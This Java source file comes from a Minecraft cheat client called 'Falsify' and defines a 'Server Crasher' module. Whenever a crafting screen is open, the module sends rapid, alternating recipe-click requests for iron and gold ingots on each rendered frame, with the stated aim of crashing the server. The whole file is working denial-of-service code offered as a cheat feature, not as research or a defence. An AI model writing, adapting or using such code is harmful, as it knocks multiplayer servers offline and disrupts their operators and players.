package falsify.falsify.module.modules.misc;

import falsify.falsify.Falsify;
import falsify.falsify.listeners.Event;
import falsify.falsify.listeners.events.EventRender;
import falsify.falsify.module.Category;
import falsify.falsify.module.Module;
import net.minecraft.client.gui.screen.ingame.CraftingScreen;
import net.minecraft.item.Item;
import net.minecraft.item.Items;
import net.minecraft.recipe.Recipe;
import net.minecraft.recipe.RecipeManager;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

import java.util.Optional;

public class ServerCrasher extends Module {

    private Recipe<?> ironIngot;
    private Recipe<?> goldIngot;
    private boolean shouldMakeIron = false;
    public ServerCrasher() {
        super("Server Crasher", "Crashes servers using crafting tables", true, Category.MISC, -1);
    }

    @Override
    public void onEvent(Event<?> event) {
        if(event instanceof EventRender && mc.currentScreen instanceof CraftingScreen screen) {
            if(ironIngot == null) this.ironIngot = mc.world.getRecipeManager().get(new Identifier("iron_ingot_from_nuggets")).get();
            if(this.goldIngot == null) this.goldIngot = mc.world.getRecipeManager().get(new Identifier("gold_ingot_from_nuggets")).get();
            if(shouldMakeIron && mc.player.getInventory().main.stream().anyMatch(itemStack -> itemStack.getItem() == Items.IRON_NUGGET && itemStack.getCount() >= 9)) {
                mc.interactionManager.clickRecipe(mc.player.currentScreenHandler.syncId, ironIngot, true);
            } else if(!shouldMakeIron && mc.player.getInventory().main.stream().anyMatch(itemStack -> itemStack.getItem() == Items.GOLD_NUGGET && itemStack.getCount() >= 9)) {
                mc.interactionManager.clickRecipe(mc.player.currentScreenHandler.syncId, goldIngot, true);
            }
            shouldMakeIron = !shouldMakeIron;
        }
    }
}
